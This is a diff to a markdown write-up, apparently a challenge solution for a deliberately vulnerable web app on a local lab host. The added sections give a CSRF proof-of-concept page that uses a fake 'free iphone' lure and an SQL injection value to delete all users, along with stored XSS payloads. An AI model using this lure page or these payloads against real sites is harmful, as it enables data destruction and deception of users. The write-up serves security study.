@@ -57,4 +57,45 @@ $ curl 'http://192.168.168.54/Vulnerable.ashx' -XPOST -H 'Host: 192.168.168.54' 
 [{"username":"PostgreSQL 9.3.9 on x86_64-unknown-linux-gnu, compiled by gcc (Ubuntu 4.8.4-2ubuntu1~14.04) 4.8.4, 64-bit"}]
 ```
 
-** WIP **
+#### Bug 6 : Cross Site Request Forgery
+
+The app is also vulnerable to CSRF which is obvious. A sample file like below which can delete all the users without user's consent proves this:
+
+```html
+<!DOCTYPE html>
+<head>
+<script>
+function deleteUser() {
+	var data = {
+		username: '\' OR 1=1--',
+		method: 'delete'
+	};
+
+	var xhr = new XMLHttpRequest();
+	xhr.open('post', 'http://192.168.168.54/Vulnerable.ashx', false);
+	xhr.send(JSON.stringify(data));
+}
+</script>
+</head>
+<body>
+<h1>We're offering free iphone to first 10 entries. Please hurry by providing your information.</h1>
+<form method="post" action="" id="frmLogin">
+<div>Your e-mail for notification</div>
+<div><input type="text" name="txtUsername" id="txtUsername" /></div>
+<div><input type="submit" name="btnSubmitNewUser" value="Submit participation" onclick="deleteUser(); return false;" id="btnSubmitNewUser" /></div>
+</form>
+</body>
+```
+
+#### Bug 7 : Cross Site Scripting
+
+A simple addition of user with username `<script>alert(1)</script>` results in stored XSS for the API in case the API is used by someone else to populate list of users. The storage is done without any sanitization and escaping of the input.
+
+For this app, you can trigger XSS via the following username:
+```html
+<img src="" onclick="alert(1)" />
+```
+
+Well, you can perform more advanced exploitations with above examples but basically I am lazy to do anything further than identifying the bugs (which is pretty obvious with this one).
+
+Game Over!
